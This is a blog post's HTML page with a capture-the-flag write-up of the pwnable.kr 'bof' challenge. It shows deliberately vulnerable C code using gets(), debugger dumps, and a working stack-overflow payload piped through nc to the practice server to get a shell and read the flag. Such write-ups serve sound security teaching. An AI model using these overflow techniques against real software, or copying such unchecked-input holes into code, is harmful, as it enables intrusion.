@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Pwnable.kr - bof.c [3]</title>
+	
+	<meta name="author" content="Marcos Valle">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/marcosValle">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/_mvalle_">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:marcosvalle@protonmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/1df7ec002d2e576bae0ee492c97e82b8?s=35" class="img-circle" />
+				Bugtree
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="//www.gravatar.com/avatar/1df7ec002d2e576bae0ee492c97e82b8?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="/">Bugtree</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Born to kill bugs. Live by them.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/marcosValle">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/_mvalle_">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:marcosvalle@protonmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/mvallecyber">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Pwnable.kr - bof.c [3] </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   December 
+	   9th,
+	   
+	   2016
+	 </span>
+	  <div class="article_body">
+	  <p>Pwnable.kr’s third challenge goes like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 900
+</code></pre></div></div>
+
+<p>Let us first download <em>bof.c</em> file from the given link and compile it under x86 architecture:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -m32 bof.c -o bof
+</code></pre></div></div>
+
+<p>This is the first time we meet the beautiful beast called <em>buffer overflow</em> (mistery emphasis sound). Although very simple in this case, there are some gotchas that will really pull your leg in case you want to fully understand what is going on. Like those missing pieces in a puzzle that are in fact little secrets nobody actually tells you :)</p>
+
+<p>In case you are surprised, I am talking about compiler optimizations. Keep this in mind: the code you write is not the code the machine runs. Indeed, if you translate your <em>C</em> code to <em>Assembly</em> by hand you would probably be very surprised how different they are, even if you don’t make any stupid mistakes - which you will. The main point so far is you should not try to predict your compiled code but instead you should debug it and believe only what you see there.</p>
+
+<p>Enough of this senseless introduction. After all, if you came to this page you probably have no idea of what this is all about.</p>
+
+<h2 id="the-stack">The stack</h2>
+<p>The internet is full of silly tutorials and blog posts about the stack and how buffer overflows work. In case you need some references, go for the classical <a href="https://www.eecs.umich.edu/courses/eecs588.w14/static/stack_smashing.pdf">Smashing the Stack for fun and Profit</a> and the amazing <a href="http://duartes.org/gustavo/blog/post/journey-to-the-stack/">Journey to the Stack</a>. I will consider you now understand the basics about this stuff.</p>
+
+<p>First let us take a look at <em>bof.c</em>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+void func(int key){
+    char overflowme[32];
+    printf("overflow me : ");
+    gets(overflowme);   // smash me!
+    if(key == 0xcafebabe){
+        system("/bin/sh");
+    }   
+    else{
+        printf("Nah..\n");
+    }   
+}
+int main(int argc, char\* argv[]){
+    func(0xdeadbeef);
+    return 0;
+}
+</code></pre></div></div>
+
+<p>My idea here is to solve this chall while showing step by step how the stack would look like. When <em>main()</em> calls <em>func()</em>, here is what we should have:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>main | 0xdeadbeef | RET VAL | SAVED EBP | overflowme
+</code></pre></div></div>
+
+<p>What we want to do is send a big input such that <em>gets()</em> will read more than our buffer size (32 bytes) into the stack. C is a powerfull language, it allows you to do pretty much everything with the memory, for better or worse. If we send more than 32 bytes to our program it will not simply crash. It will instead overflow other positions in the stack, altering its values! If we do things right we might even get to <em>key</em> value in the stack and put <em>0xcaffebabe</em> in there.</p>
+
+<p>Now, how many bytes exactly would we need to send? Let’s say we will send <em>AAA…A\xbe\xba\xfe\xca</em>. How many padding <em>A</em>’s do we need? Looking at our stack diagram you might say “Dã, 32+4+4 = 40”. So we would need to send 40 <em>A</em>’s and then append our new <em>key</em> value (notice the little endian notation), right? Sadly no.</p>
+
+<p>Remember when I said you should not try to predict your compiled code? Here is an example why. The stack does not behave like that in practice due to compiler optimizations. I might write a post about it some other time but for now you might want to check <a href="https://stackoverflow.com/questions/20865235/why-gcc-disassembler-allocating-extra-space-for-local-variable">this SO answer</a> and this cool paper(https://wr.informatik.uni-hamburg.de/_media/teaching/wintersemester_2013_2014/epc-14-haase-svenhendrik-alignmentinc-paper.pdf). Instead, here is how it actually looks like:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>main | 0xdeadbeef | RET VAL | SAVED EBP | 0x00000003 | 0x00000001 | 0x67368200  
+</code></pre></div></div>
+
+<h2 id="debugging">Debugging</h2>
+<p>You might be asking how the heck do I know it? All the answers rely on <a href="https://www.tutorialspoint.com/gnu_debugger/">GDB</a>. Plus, you should also be using <a href="https://github.com/longld/peda">PEDA</a> from now on for everything related to RE, PWNing, exploits and other creatures alike. Fire up your debugger:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$gdb .bof
+</code></pre></div></div>
+
+<p>Now let’s see how our assembly code looks like:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x0804856a &lt;+0&gt;: lea    ecx,[esp+0x4]
+   0x0804856e &lt;+4&gt;: and    esp,0xfffffff0
+   0x08048571 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]
+   0x08048574 &lt;+10&gt;:    push   ebp
+   0x08048575 &lt;+11&gt;:    mov    ebp,esp
+   0x08048577 &lt;+13&gt;:    push   ecx
+   0x08048578 &lt;+14&gt;:    sub    esp,0x4
+   0x0804857b &lt;+17&gt;:    sub    esp,0xc
+   0x0804857e &lt;+20&gt;:    push   0xdeadbeef
+   0x08048583 &lt;+25&gt;:    call   0x80484fb &lt;func&gt;
+   0x08048588 &lt;+30&gt;:    add    esp,0x10
+   0x0804858b &lt;+33&gt;:    mov    eax,0x0
+   0x08048590 &lt;+38&gt;:    mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048593 &lt;+41&gt;:    leave  
+   0x08048594 &lt;+42&gt;:    lea    esp,[ecx-0x4]
+   0x08048597 &lt;+45&gt;:    ret    
+End of assembler dump.
+gdb-peda$ disassemble func
+Dump of assembler code for function func:
+   0x080484fb &lt;+0&gt;: push   ebp
+   0x080484fc &lt;+1&gt;: mov    ebp,esp
+   0x080484fe &lt;+3&gt;: sub    esp,0x38
+   0x08048501 &lt;+6&gt;: mov    eax,gs:0x14
+   0x08048507 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804850a &lt;+15&gt;:    xor    eax,eax
+   0x0804850c &lt;+17&gt;:    sub    esp,0xc
+   0x0804850f &lt;+20&gt;:    push   0x8048620
+   0x08048514 &lt;+25&gt;:    call   0x8048390 &lt;printf@plt&gt;
+   0x08048519 &lt;+30&gt;:    add    esp,0x10
+   0x0804851c &lt;+33&gt;:    sub    esp,0xc
+   0x0804851f &lt;+36&gt;:    lea    eax,[ebp-0x2c]
+   0x08048522 &lt;+39&gt;:    push   eax
+   0x08048523 &lt;+40&gt;:    call   0x80483a0 &lt;gets@plt&gt;
+   0x08048528 &lt;+45&gt;:    add    esp,0x10
+   0x0804852b &lt;+48&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x08048532 &lt;+55&gt;:    jne    0x8048546 &lt;func+75&gt;
+   0x08048534 &lt;+57&gt;:    sub    esp,0xc
+   0x08048537 &lt;+60&gt;:    push   0x804862f
+   0x0804853c &lt;+65&gt;:    call   0x80483d0 &lt;system@plt&gt;
+   0x08048541 &lt;+70&gt;:    add    esp,0x10
+   0x08048544 &lt;+73&gt;:    jmp    0x8048556 &lt;func+91&gt;
+   0x08048546 &lt;+75&gt;:    sub    esp,0xc
+   0x08048549 &lt;+78&gt;:    push   0x8048637
+   0x0804854e &lt;+83&gt;:    call   0x80483c0 &lt;puts@plt&gt;
+   0x08048553 &lt;+88&gt;:    add    esp,0x10
+   0x08048556 &lt;+91&gt;:    nop
+   0x08048557 &lt;+92&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0804855a &lt;+95&gt;:    xor    eax,DWORD PTR gs:0x14
+   0x08048561 &lt;+102&gt;:   je     0x8048568 &lt;func+109&gt;
+   0x08048563 &lt;+104&gt;:   call   0x80483b0 &lt;__stack_chk_fail@plt&gt;
+   0x08048568 &lt;+109&gt;:   leave  
+   0x08048569 &lt;+110&gt;:   ret    
+End of assembler dump.
+</code></pre></div></div>
+
+<p>Don’t panic! Skimm through this bunch of letters and get only what really matters. Our goal here is to overflow the variable (surprise!) <em>overflowme</em> so that we can control the value of <em>key</em>. First thing we need is to add a breakpoint just before we call <em>gets()</em>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ break \*0x08048523
+Breakpoint 1 at 0x8048523
+gdb-peda$ run
+Starting program: /tmp/bof 
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0xffffcedc --&gt; 0xcd57 
+EBX: 0x0 
+ECX: 0x804b016 --&gt; 0x0 
+EDX: 0xf7fa9870 --&gt; 0x0 
+ESI: 0xf7fa8000 --&gt; 0x1b1db0 
+EDI: 0xf7fa8000 --&gt; 0x1b1db0 
+EBP: 0xffffcf08 --&gt; 0xffffcf28 --&gt; 0x0 
+ESP: 0xffffcec0 --&gt; 0xffffcedc --&gt; 0xcd57 
+EIP: 0x8048523 (&lt;func+40&gt;:  call   0x80483a0 &lt;gets@plt&gt;)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804851c &lt;func+33&gt;: sub    esp,0xc
+   0x804851f &lt;func+36&gt;: lea    eax,[ebp-0x2c]
+   0x8048522 &lt;func+39&gt;: push   eax
+=&gt; 0x8048523 &lt;func+40&gt;: call   0x80483a0 &lt;gets@plt&gt;
+   0x8048528 &lt;func+45&gt;: add    esp,0x10
+   0x804852b &lt;func+48&gt;: cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x8048532 &lt;func+55&gt;: jne    0x8048546 &lt;func+75&gt;
+   0x8048534 &lt;func+57&gt;: sub    esp,0xc
+Guessed arguments:
+arg[0]: 0xffffcedc --&gt; 0xcd57 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcec0 --&gt; 0xffffcedc --&gt; 0xcd57 
+0004| 0xffffcec4 --&gt; 0xf7ffd918 --&gt; 0x0 
+0008| 0xffffcec8 --&gt; 0xffffcee0 --&gt; 0xffffffff 
+0012| 0xffffcecc --&gt; 0x804829f ("_\_libc_start_main")
+0016| 0xffffced0 --&gt; 0x0 
+0020| 0xffffced4 --&gt; 0xffffcf74 --&gt; 0xaedfbccf 
+0024| 0xffffced8 --&gt; 0xf7fa8000 --&gt; 0x1b1db0 
+0028| 0xffffcedc --&gt; 0xcd57 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048523 in func ()
+</code></pre></div></div>
+
+<p>Since we don’t want to enter the <em>gets()</em> function, let’s just skip it</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ next
+overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+ [----------------------------------registers-----------------------------------]
+EAX: 0xffffcedc ('A' &lt;repeats 32 times&gt;)
+EBX: 0x0 
+ECX: 0xf7fa85a0 --&gt; 0xfbad2288 
+EDX: 0xf7fa987c --&gt; 0x0 
+ESI: 0xf7fa8000 --&gt; 0x1b1db0 
+EDI: 0xf7fa8000 --&gt; 0x1b1db0 
+EBP: 0xffffcf08 --&gt; 0xffffcf28 --&gt; 0x0 
+ESP: 0xffffcec0 --&gt; 0xffffcedc ('A' &lt;repeats 32 times&gt;)
+EIP: 0x8048528 (&lt;func+45&gt;:  add    esp,0x10)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804851f &lt;func+36&gt;: lea    eax,[ebp-0x2c]
+   0x8048522 &lt;func+39&gt;: push   eax
+   0x8048523 &lt;func+40&gt;: call   0x80483a0 &lt;gets@plt&gt;
+=&gt; 0x8048528 &lt;func+45&gt;: add    esp,0x10
+   0x804852b &lt;func+48&gt;: cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x8048532 &lt;func+55&gt;: jne    0x8048546 &lt;func+75&gt;
+   0x8048534 &lt;func+57&gt;: sub    esp,0xc
+   0x8048537 &lt;func+60&gt;: push   0x804862f
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcec0 --&gt; 0xffffcedc ('A' &lt;repeats 32 times&gt;)
+0004| 0xffffcec4 --&gt; 0xf7ffd918 --&gt; 0x0 
+0008| 0xffffcec8 --&gt; 0xffffcee0 ('A' &lt;repeats 28 times&gt;)
+0012| 0xffffcecc --&gt; 0x804829f ("_\_libc_start_main")
+0016| 0xffffced0 --&gt; 0x0 
+0020| 0xffffced4 --&gt; 0xffffcf74 --&gt; 0xaedfbccf 
+0024| 0xffffced8 --&gt; 0xf7fa8000 --&gt; 0x1b1db0 
+0028| 0xffffcedc ('A' &lt;repeats 32 times&gt;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08048528 in func ()
+</code></pre></div></div>
+
+<p>This is why we love debuggers. We can stop in the middle of the execution and inspect what is going on behind the curtains. How is the stack right now, just after we pass 32 <em>A</em>’s?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ x/16x $ebp-52
+0xffffced4: 0xffffcf74  0xf7fa8000  0x41414141  0x41414141
+0xffffcee4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffcef4: 0x41414141  0x41414141  0x67368200  0x00000001
+0xffffcf04: 0x00000003  0xffffcf28  0x08048588  0xdeadbeef
+</code></pre></div></div>
+
+<p>We are showing here the stack from 52 bytes under EBP until <em>0xdeadbeef</em>. Please notice that the gcc aligns bytes in blocks of 16. Due to this alignment and possibly other optimizations, the compiler adds 3 more groups of 16 bytes each!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x67368200  0x00000001  0x00000003 
+</code></pre></div></div>
+
+<p>Ok, so now we know we must prepend 3*4 more <em>A</em>’s to our payload. An elegant way of printing our payload is:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ (python2.7 -c 'print "A" * 52 + "\xbe\xba\xfe\xca"')
+</code></pre></div></div>
+
+<p>All right, now we just need to send it to the server and get our flag! Sending</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ (python2.7 -c 'print "A" * 52 + "\xbe\xba\xfe\xca"') | nc pwnable.kr 9000
+</code></pre></div></div>
+
+<p>Will result in the shell being closed just after being opened. In order to keep it open we use the <em>cat -</em> trick. If you have never seen it, get used to, because it is really useful:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ (python2.7 -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
+ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+cat flag
+daddy, I just pwned a buFFer :)
+</code></pre></div></div>
+
+<p>There you go! :)</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#ctf-ref">
+					ctf <span>(13)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#writeups-ref">
+					writeups <span>(13)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#infosec-ref">
+					infosec <span>(13)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#ctf-ref">
+					ctf <span>(14)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#wargame-ref">
+					wargame <span>(7)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#re-ref">
+					re <span>(5)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Pwnable.kr - bof.c [3]&via=_mvalle_"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/1df7ec002d2e576bae0ee492c97e82b8" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Marcos Valle</h4>
+        <p class="author-bio">Born to kill bugs. Live by them.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/ctf/2016/12/06/pwnablekr-2.html" title="Pwnable.kr - collision [2]">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/ctf/2016/12/13/seccon-vigenere.html" title="SECCON/2016 - Vigenere">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+    
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'marcos_valle91';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2017 Marcos Valle with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'Bugtree', 'auto');
+  ga('send', 'pageview');
+</script>
+
